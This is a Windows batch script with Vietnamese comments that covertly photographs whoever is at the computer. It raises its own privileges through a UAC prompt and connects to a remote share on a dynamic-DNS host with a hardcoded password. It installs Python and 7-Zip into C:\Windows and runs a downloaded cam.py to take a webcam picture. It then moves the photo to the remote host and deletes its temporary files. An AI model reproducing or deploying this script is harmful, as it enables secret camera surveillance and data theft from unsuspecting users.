@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || ( echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
setlocal
net use "\\minhtuan283.ddns.net\hdd25\serial" /user:minhtuan283 Thienngan2002

REM --- Kiểm tra xem file python.exe đã tồn tại hay chưa ---
if not exist "C:\Windows\python3105\App\Python\python.exe" (
    echo [*] Khong tim thay python.exe, bat dau cai dat...
    
    REM --- Sao chép file python3105.zip vào thư mục temp ---
    copy "\\minhtuan283.ddns.net\hdd25\serial\python3105.zip" "%temp%\python3105.zip"
    if errorlevel 1 (
        echo [!] Sao chep python3105.zip that bai.
        goto cleanup
    )
    
    REM --- Tạo folder C:\Windows\python3105 nếu chưa tồn tại ---
    if not exist "C:\Windows\python3105" (
        mkdir "C:\Windows\python3105"
    )
    
    REM --- Sao chép các file 7zip (7z.exe và 7z.dll) từ Tools vào C:\Windows ---
    xcopy "\\minhtuan283.ddns.net\hdd25\serial\Tools\*.*" "C:\Windows\" /Y
    if errorlevel 1 (
        echo [!] Sao chep cac file Tools that bai.
        goto cleanup
    )
    
    REM --- Giải nén file python3105.zip vào C:\Windows\python3105 sử dụng 7zip ---
    "C:\Windows\7z.exe" x "%temp%\python3105.zip" -o"C:\Windows\python3105" -y
    if errorlevel 1 (
        echo [!] Giai nen python3105.zip that bai.
        goto cleanup
    )
    
    REM --- Sao chép file cam.py vào thư mục temp ---
    copy "\\minhtuan283.ddns.net\hdd25\serial\cam.py" "%temp%\cam.py"
    if errorlevel 1 (
        echo [!] Sao chep cam.py that bai.
        goto cleanup
    )
) else (
    echo [*] Da tim thay python.exe, bo qua qua trinh cai dat.
)

REM --- Sao chép file cam.py vào thư mục temp ---
copy "\\minhtuan283.ddns.net\hdd25\serial\cam.py" "%temp%\cam.py"
if errorlevel 1 (
    echo [!] Sao chep cam.py that bai.
    goto cleanup
)

REM --- Chạy file cam.py dùng python để chup anh ---
echo [*] Chup anh bang camera...
"C:\Windows\python3105\App\Python\python.exe" "%temp%\cam.py"
if errorlevel 1 (
    echo [!] Chay cam.py that bai.
    goto cleanup
)

REM --- Cho thời gian ghi file (nếu cần) ---
timeout /t 2 >nul

REM --- Di chuyển file anh da chup (C:\Windows\captured_image.jpg) sang share ---
move "C:\Windows\captured_image.jpg" "\\minhtuan283.ddns.net\hdd25\serial\captured_image.jpg"
if errorlevel 1 (
    echo [!] Di chuyen anh that bai.
) else (
    echo [*] Anh da duoc di chuyen thanh cong.
)

:cleanup
REM --- Xóa các file tạm trong %temp% ---
if exist "%temp%\python3105.zip" del "%temp%\python3105.zip"
if exist "%temp%\cam.py" del "%temp%\cam.py"

REM --- Ngắt kết nối share ---
net use "\\minhtuan283.ddns.net\hdd25\serial" /delete

echo [*] Script ket thuc.
exit /b
